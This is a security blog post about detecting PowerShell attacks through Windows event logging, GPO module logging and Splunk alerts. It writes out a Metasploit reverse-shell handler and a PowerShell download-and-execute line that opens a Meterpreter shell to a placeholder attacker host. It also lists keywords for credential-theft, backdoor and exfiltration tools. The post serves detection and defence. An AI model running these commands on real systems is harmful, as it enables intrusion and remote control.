---
title: "PowerShell A Traceless Threat and How to Protect Yourself"
date: 2016-01-18T13:23:00.001-05:00
draft: false
type: posts
categories: 
- cybersecurity,Events,infosec,logs. incident,powershell,Security,SIEM,SIEM Alerts,windows
---
# PowerShell A Traceless Threat and How to Protect Yourself

<br/>

<br/>
For the past little while I have been spending time learning about PowerShell and how it can be used as a subtle threat vector within your network. A number of PowerShell exploitation frameworks have popped up recently including [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) and [Empire](http://www.redblue.team/2015/09/empire-post-exploitation-analysis-with.html), which Greg covered in length back in September. I, however, wanted to spend some time to show how subtle and insidious PowerShell can be when used as a threat medium.  
  
As mentioned in an earlier post, according to [Verizon's 2013 Data Breach Report](http://www.verizonenterprise.com/resources/reports/rp_data-breach-investigations-report-2013_en_xg.pdf) 76% of breaches involved stolen or weak credentials, so, to start, this post will assume that you have already been exploited and the attacker potentially has admin or domain admin credentials to focus on PowerShell as a threat vector.  
  
A huge thank you to the work done by [Ryan Kazanciyan](https://www.linkedin.com/in/ryankaz) and [Matt Hastings](https://www.linkedin.com/in/matt-hastings-78b6ba45) for their [research](https://www.fireeye.com/blog/threat-research/2014/08/black-hat-usa-talks-investigating-powershell-attacks.html) on PowerShell attacks, which was the starting point and principal resource for research on this topic.  
  

### Downloading and Connecting to Metasploit

Once an actor gains access to a random Windows server within your environment the first action they will typically perform is to escalate privileges. PowerSploit has a nifty PowerShell module called Invoke-ShellCode that can invoke shellcode into a running process or even PowerShell itself. So for example, you can set up a Kali Linux server with a Metasploit server listening on port 443 for incoming shellcode commands:  

```
Metasploit:
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_https
msf exploit(handler) > set LHOST <Your local host>
msf exploit(handler) > set LPORT 443
msf exploit(handler) > exploit
```

Then you can run the following commands to download and run the PowerShell Invoke-Shellcode script (default Invoke--Shellcode in the Git repositories. That was a wasted day and a half.) This will create an HTTPS connection back to a C&C Meterpreter shell, or worse:  

```
PowerShell:
IEX (New-Object Net.WebClient).DownloadString("https://<Malicious URL>/Invoke-Shellcode.ps1")
Invoke-ShellCode -Payload windows/meterpreter/reverse_https -Lhost <malicious IP> -Lport 443 -Force
```

  

### Event Logging

Because both the download and ShellCode connections are via HTTPS most perimeter IPS/AntiVirus will not inspect them. The ShellCode runs in memory and doesn't hit the disk, leaving it very difficult to detect by both Antiviruses and classic forensics, but the important thing to focus on here is how PowerShell logs these events while hunting. Executing the above on a Windows 2008 R2 OS with PowerShell 2.0 generates only three relevant events in the Windows PowerShell event log:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgjACjneD5MmvX3C6d-iHEQgHRUIGr_bOx0Aiz0SKPvrYF5qE_PGALT4wteV3uUGmABzwqF8BiTVPkI0DvrhkbKjG8qNLn2d8Pq47EjKY5SI-8dOvG4JeNn7UeSCQl7RI5Jl2gceq9_xPq/s1600/PowerShell+2.0+Invoke-ShellCode+Events+-+EventLog.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgjACjneD5MmvX3C6d-iHEQgHRUIGr_bOx0Aiz0SKPvrYF5qE_PGALT4wteV3uUGmABzwqF8BiTVPkI0DvrhkbKjG8qNLn2d8Pq47EjKY5SI-8dOvG4JeNn7UeSCQl7RI5Jl2gceq9_xPq/s1600/PowerShell+2.0+Invoke-ShellCode+Events+-+EventLog.PNG)

The Windows PowerShell Event Log After Executing ShellCode in PowerShell

  
Leaving basically three events to go by:

400

Engine state is changed from None to Available.

403

Engine state is changed from Available to Stopped.

600

Provider "Certificate" is Started.

WinEventLog:Windows PowerShell

There is nothing in the event logs about running a script that invokes a ShellCode backdoor to my malicious C&C domain. Can you believe Windows Event Logs? Ridiculous. But security wise this is a serious concern since there is no indication of what commands or scripts were run, by whom, or what actions the system took. Running similar scripts such as Invoke-Mimikatz also produces roughly the same events from within a PowerShell context.  
  
This is a well known limitation in PowerShell 2.0; however, the challenge is that most environments run operating systems that have PowerShell 2.0 installed by default default leaving organizations who don't use PowerShell having little reason to upgrade. This also leaves an active hole in an organization's security posture towards potential threat vectors. You can't understand what is happening if your system won't tell you.  
  
PowerShell 3.0 comes with many improvements including improved logging, so running the above command on a machine with PowerShell 3.0 will give you the same three events in Windows PowerShell, but it will also give you a number of new events in both Windows-PowerShell/Operational and Windows-WinRM/Operational.  
  

403

PowerShell Console Startup

40961

Engine state is changed from None to Available.

40962

PowerShell console is ready for user input

Microsoft-Windows-PowerShell/Operational

  

208

The Winrm service is starting

209

The Winrm service started successfully

211

The Winrm service is stopping

212

The Winrm service was stopped successfully

Microsoft-Windows-WinRM/Operational

  
This is better--we are able to see that the powershell console was manually started and that the WinRM service was used in some capacity; but there is no knowledge of what scripts or commands were run or what the results of said commands were. On a side note, while running Invoke-ShellCode I mistyped the URL and received an event log 4100 with the error message "No connection could be made because the target machine actively refused." More on that later, but for now the overall lack of usable events is frightening and cannot stand.  
  

### PowerShell Module Logging

One option is to add logging options to the global PowerShell profile; however, profiles can be easily bypassed by adding the "-NoProfile" flag to your commands. The best option, however, is to enable PowerShell Module Logging in your GPO \[Edit: PowerShell 3.0+ is required on the system.\] To do so go to to your **Group Policy Editor** -> **Computer Configuration** -> **Policies** \-> **Administrative Templates** -> **Windows Components** -> **Windows PowerShell**:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuZB0iSmfsrtXpC1kKh9WjJSz9F4Cvt6k93YU0IZf02c8SPLLls1pmchIebaoUcQrh4UCZQZIt2Mhc7eKDFm-z-GPX3Ec5UP4txYf1_k_z63IB5Y_7vmCiTzAtpE6enVfBCHYkzuTJ0rvh/s400/GPO.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuZB0iSmfsrtXpC1kKh9WjJSz9F4Cvt6k93YU0IZf02c8SPLLls1pmchIebaoUcQrh4UCZQZIt2Mhc7eKDFm-z-GPX3Ec5UP4txYf1_k_z63IB5Y_7vmCiTzAtpE6enVfBCHYkzuTJ0rvh/s1600/GPO.png)

  

GPO Windows PowerShell Module Logging Location

  

The Windows PowerShell section will list the Turn on Module Logging section:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsb1BVBwwp7NaI8Hg3wbQb_Xp3p8J8h1b_rxVT7nFNGOIQUxiCirBtxdoui3YH-5k_wkmiuvkcn24Qb09krFe7pA_Gn0VEqbXgZ74_MiQHjXWvXKZ1Umts-lKWzpG2-fpwu5GIzkE5rby-/s400/GPO+1.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsb1BVBwwp7NaI8Hg3wbQb_Xp3p8J8h1b_rxVT7nFNGOIQUxiCirBtxdoui3YH-5k_wkmiuvkcn24Qb09krFe7pA_Gn0VEqbXgZ74_MiQHjXWvXKZ1Umts-lKWzpG2-fpwu5GIzkE5rby-/s1600/GPO+1.PNG)

Windows PowerShell Module Logging Modules

  

Select Enabled and click the Modules Names: Show button:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7Eplm7M_Z0f3Hj_jaf6Kwz_Kb-47qu6ZwRKIAuyjhysisJ1kAXhCCDPkRm2YAcwR6ommVPfqFOZn3Gwm7uJy30ZBtSH9_KzSTrJ2ghPCEuRdy0N2PffOHq1ZfKz25GrkLOvc17HSaBnRO/s400/GPO+2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7Eplm7M_Z0f3Hj_jaf6Kwz_Kb-47qu6ZwRKIAuyjhysisJ1kAXhCCDPkRm2YAcwR6ommVPfqFOZn3Gwm7uJy30ZBtSH9_KzSTrJ2ghPCEuRdy0N2PffOHq1ZfKz25GrkLOvc17HSaBnRO/s1600/GPO+2.png)

Windows PowerShell Module Logging Properties

  

From there add the lines "**Microsoft.PowerShell.\***" and "**Microsoft.WSMan.Management**":  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfQq1O1ryg8nCHILVGdAODPPj1IPdrHiVqO9MnpzFbFvlza4WKw4QNH-M3HOQrwnBFk-DNuSsqyRspOO7u4XA4PRGcyiB0Wrp-1Vbb8huyxTJxY3HER_q4ZElcgEl5ciMW-UJeF1aqDYtK/s320/GPO+3.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfQq1O1ryg8nCHILVGdAODPPj1IPdrHiVqO9MnpzFbFvlza4WKw4QNH-M3HOQrwnBFk-DNuSsqyRspOO7u4XA4PRGcyiB0Wrp-1Vbb8huyxTJxY3HER_q4ZElcgEl5ciMW-UJeF1aqDYtK/s1600/GPO+3.png)

  

Module Logging for PowerShell and WSMan

Now, let's try the remote shellcode connection again:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjC0b6TQ58_wavGLYIgz2GoqD5oFKHwHcGaBUG-I43yZ7Ty4SEB6dWQtmDesz0UzV436stIOrVI4UR5yKF9LmaeW8oXo6QY4wR2BpGugG6Bat7i1pw3AmSPest288q2FjmUdDuibCmTWK8E/s320/ShellCode+Event.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjC0b6TQ58_wavGLYIgz2GoqD5oFKHwHcGaBUG-I43yZ7Ty4SEB6dWQtmDesz0UzV436stIOrVI4UR5yKF9LmaeW8oXo6QY4wR2BpGugG6Bat7i1pw3AmSPest288q2FjmUdDuibCmTWK8E/s1600/ShellCode+Event.PNG)

Windows Event Log with Module Logging

  

It worked! We can see the commands that were executed. It worked... To well. We see around 300 events--one event for each command executed in the Invoke-Shellcode script. Well this is quite troubling. You are going to need a SIEM to process this type of volume, which we will use Splunk for this scenario.

  

### Setting up Splunk for PowerShell Events

To input PowerShell events into Splunk, create a input.conf with the following stanzas:  

\[WinEventLog://Windows PowerShell\]
disabled = false
index = wineventlog

These stanzas will read events from the Windows PowerShell event logs, which is where the PowerShell commands are saved. Alternative Windows Events that you can save for good posture are PowerShell Operational, PowerShell Analytic and WinRM Operational event logs. Use the following Stanza for each:

  

\[WinEventLog://Microsoft-Windows-PowerShell/Operational\]
disabled = false
index = wineventlog

\[WinEventLog://Microsoft-Windows-PowerShell/Analytic\]
disabled = false
index = wineventlog
\[WinEventLog://Microsoft-Windows-WinRM/Operational\]
disabled = false
index = wineventlog

So now that we have our events into Splunk we need a way to search for malicious events. First, what is a malicious event in PowerShell? I like to look for keywords used in [gfoss](https://gist.github.com/gfoss/)' [PowerShell Command Line Logging](https://gist.github.com/gfoss/2b39d680badd2cad9d82) list:  

-   Set-ExecutionPolicy
-   Mimikatz
-   EncodedCommand
-   Payload
-   Find-AVSignature
-   DllInjection
-   ReflectivePEInjection
-   Invoke-Shellcode
-   Invoke--Shellcode
-   Invoke-ShellcodeMSIL
-   Get-GPPPassword
-   Get-Keystrokes
-   Get-TimedScreenshot
-   Get-VaultCredential
-   Invoke-CredentialInjection
-   Invoke-NinjaCopy
-   Invoke-TokenManipulation
-   Out-Minidump
-   Set-MasterBootRecord
-   New-ElevatedPersistenceOption
-   Invoke-CallbackIEX
-   Invoke-PSInject
-   Invoke-DllEncode
-   Get-ServiceUnquoted
-   Get-ServiceEXEPerms
-   Get-ServicePerms
-   Invoke-ServiceUserAdd
-   Invoke-ServiceCMD
-   Write-UserAddServiceBinary
-   Write-CMDServiceBinary
-   Write-UserAddMSI
-   Write-ServiceEXE
-   Write-ServiceEXECMD
-   Restore-ServiceEXE
-   Invoke-ServiceStart
-   Invoke-ServiceStop
-   Invoke-ServiceEnable
-   Invoke-ServiceDisable
-   Invoke-FindDLLHijack
-   Invoke-FindPathHijack
-   Get-RegAlwaysInstallElevated
-   Get-RegAutoLogon
-   Get-UnattendedInstallFiles
-   Get-Webconfig
-   Get-ApplicationHost
-   Invoke-AllChecks
-   Invoke-MassCommand
-   Invoke-MassMimikatz
-   Invoke-MassSearch
-   Invoke-MassTemplate
-   Invoke-MassTokens
-   HTTP-Backdoor
-   Add-ScrnSaveBackdoor
-   Gupt-Backdoor
-   Invoke-ADSBackdoor
-   Execute-OnTime
-   DNS\_TXT\_Pwnage
-   Out-Word
-   Out-Excel
-   Out-Java
-   Out-Shortcut
-   Out-CHM
-   Out-HTA
-   Enable-DuplicateToken 
-   Remove-Update
-   Execute-DNSTXT-Code
-   Download-Execute-PS
-   Execute-Command-MSSQL
-   Download\_Execute
-   Get-PassHashes
-   Invoke-CredentialsPhish
-   Get-LsaSecret
-   Get-Information
-   Invoke-MimikatzWDigestDowngrade
-   Copy-VSS
-   Check-VM
-   Invoke-NetworkRelay
-   Create-MultipleSessions
-   Run-EXEonRemote
-   Invoke-BruteForce
-   Port-Scan
-   Invoke-PowerShellIcmp
-   Invoke-PowerShellUdp
-   Invoke-PsGcatAgent
-   Invoke-PoshRatHttps
-   Invoke-PowerShellTcp
-   Invoke-PoshRatHttp
-   Invoke-PowerShellWmi
-   Invoke-PSGcat
-   Remove-PoshRat
-   TexttoEXE
-   Invoke-Encode
-   Invoke-Decode
-   Base64ToString
-   StringtoBase64
-   Do-Exfiltration
-   Parse\_Keys
-   Add-Exfiltration
-   Add-Persistence
-   Remove-Persistence
-   Invoke-CreateCertificate
-   powercat
-   Find-PSServiceAccounts
-   Get-PSADForestKRBTGTInfo
-   Discover-PSMSSQLServers
-   Discover-PSMSExchangeServers
-   Get-PSADForestInfo
-   Get-KerberosPolicy
-   Discover-PSInterestingServices

To search this in Splunk would be very expensive as a regex search, especially if you're putting this into an alert. Two options are to static-code a search of all of the above malicious values, or to create a CSV file that Splunk can use as a lookup for key words in the search. For example, create the CSV BadPowerShellCommands.csv with the heading BadPowerShellCommand and the commands in the column underneath and upload it to your /opt/splunk/etc/system/lookups folder. Now, run the search:  

index=wineventlog sourcetype="WinEventLog:Windows PowerShell" \[|inputlookup BadPowerShellCommands.csv| rename BadPowerShellCommand as search | format\]

This will filter your PowerShell result set with anything containing a malicious command. Next, in the search page, click the Save As button and save as Alert:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWglMfUSMpwleUYngLuLsFc9EMUwCqFHYijsj3E8ByRhNHee_a3ZskK9byk_BAvnGY9cW3UdJ5OKRDAkjyxkucyDU4D9jN0vg-58YyUEdKHuRli8xb1Ot8o7bhwg4tdCMUtYd5Cga83mBP/s400/Save+Alert+As+1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWglMfUSMpwleUYngLuLsFc9EMUwCqFHYijsj3E8ByRhNHee_a3ZskK9byk_BAvnGY9cW3UdJ5OKRDAkjyxkucyDU4D9jN0vg-58YyUEdKHuRli8xb1Ot8o7bhwg4tdCMUtYd5Cga83mBP/s1600/Save+Alert+As+1.png)

Splunk Search with Save option for creating an Alert

  

Opens the Alert Creation window:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3kAQCC2jAHCfiDH_G0W-brUG_2erKwQN2z3dyniqisDLYxk2p3OvWbHaz3vm2GNLlQVBIr4DrsRk4SbJlTk0GPrbzTD-NMwQlzdFSeMjKMafXoE6d_WaPTNsJq8nWIruLJ6R1MBGBmXQG/s400/Save+Alert+As+2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3kAQCC2jAHCfiDH_G0W-brUG_2erKwQN2z3dyniqisDLYxk2p3OvWbHaz3vm2GNLlQVBIr4DrsRk4SbJlTk0GPrbzTD-NMwQlzdFSeMjKMafXoE6d_WaPTNsJq8nWIruLJ6R1MBGBmXQG/s1600/Save+Alert+As+2.png)

Alert creation screen

  
Depending on your environment you may need to play with the scenarios that you alert on, such as if your administrators are heavy PowerShell users you may want to whitelist your administrators until off hours/non-change window periods. I would also monitor for the command "Enable-PSRemoting" since this command enables the ability to remotely execute PowerShell commands on a local machine. Only administrators with a purpose should enable this feature.  
  
Finally, depending on if your environment doesn't use PowerShell you can look for interactive PowerShell commands (or maybe just during off hours/non-change windows) such as "Invoke-Command" and "Enter-PSSession".

#### [Source](https://www.redblue.team/feeds/4213481668373753553/comments/default)

<br/>
---
